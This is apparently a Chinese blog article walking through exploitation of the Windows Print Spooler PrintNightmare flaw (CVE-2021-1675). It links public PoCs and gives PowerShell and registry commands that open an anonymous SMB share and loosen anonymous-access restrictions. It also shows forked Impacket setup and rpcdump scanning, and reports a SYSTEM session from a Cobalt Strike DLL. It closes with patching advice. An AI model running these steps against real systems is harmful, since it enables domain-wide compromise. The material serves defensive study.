> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/ul6nh4g5xSN_4JcZmT118A)

1、漏洞描述

        Windows Print Spooler 是 Windows 的打印机后台处理程序，广泛的应用于各种内网中。近期安全研究人员在 Github 公布了 Windows PrintSpooler 远程代码执行漏洞 POC。攻击者可以通过该漏洞绕过 PfcAddPrinterDriver 的安全验证，并在打印服务器中安装恶意的驱动程序，若攻击者所控制的用户在域中，则攻击者可以连接到 DC 中的 Spooler 服务，并利用该漏洞在 DC 中安装恶意的驱动程序，完整的控制整个域环境。

        Github 公布的地址：https://github.com/afwu/PrintNightmare

2、漏洞准备

        这里我们使用 python 版本的 poc

        地址：https://github.com/cube0x0/CVE-2021-1675

        环境：win2016  

        首先创建一个可以允许匿名访问的 smb

        创建时使用 powershell

```
mkdirC:\share
icaclsC:\share\ /T /grant Anonymous` logon:r
icaclsC:\share\ /T /grant Everyone:r
New-SmbShare-Path C:\share -Name share -ReadAccess 'ANONYMOUS LOGON','Everyone'
REG ADD"HKLM\System\CurrentControlSet\Services\LanManServer\Parameters" /vNullSessionPipes /t REG_MULTI_SZ /d srvsvc /f #This will overwrite existingNullSessionPipes
REG ADD"HKLM\System\CurrentControlSet\Services\LanManServer\Parameters" /vNullSessionShares /t REG_MULTI_SZ /d share /f
REG ADD"HKLM\System\CurrentControlSet\Control\Lsa" /v EveryoneIncludesAnonymous/t REG_DWORD /d 1 /f
REG ADD"HKLM\System\CurrentControlSet\Control\Lsa" /v RestrictAnonymous /tREG_DWORD /d 0 /f
# Reboot
```

![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV0rw95dQGZBCZPLv1Vb23S56CJicugeMeNBdf9YG3DnTHskPtXQpqLt1G08q4IrLbnEoM234zkibicxQ/640?wx_fmt=png)

3、漏洞利用

        在运行漏洞利用之前，您需要安装 Impacket 版本

```
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install
```

```
rpcdump.py @192.168.1.10 | grep MS-RPRN
```

        可以使用`rpcdump.py`来扫描潜在的易受攻击的主机，如果它返回一个值，它可能是易受攻击的

```
rpcdump.py @192.168.1.10 | grep MS-RPRN
```

```
协议：[MS-RPRN]：打印系统远程协议
```

![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV0rw95dQGZBCZPLv1Vb23S5b2kFcHpbxgVc7ibbN2hiaS7jOPO9KMcgFQ25Qb2vOE6m6s5EQhNlnEhw/640?wx_fmt=png)  

然后进行利用，这里使用 dll 是 cs 生成的 dll

![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV0rw95dQGZBCZPLv1Vb23S58ycL3vzibPaAyjMBPnT891WCbd4TibzCgViceJEB2X0K9jOw3nrOiaM3XQ/640?wx_fmt=png)

返回了 system 的会话

![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV0rw95dQGZBCZPLv1Vb23S5aJ6E6ZFqfPlu3QtMxovg2bWzGibQKruu6pAY9tRibTFHibZqEElmXhTpA/640?wx_fmt=png)

4、修复建议

        安装微软 **CVE-2021-1675** 漏洞补丁

https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675

        关闭打印机服务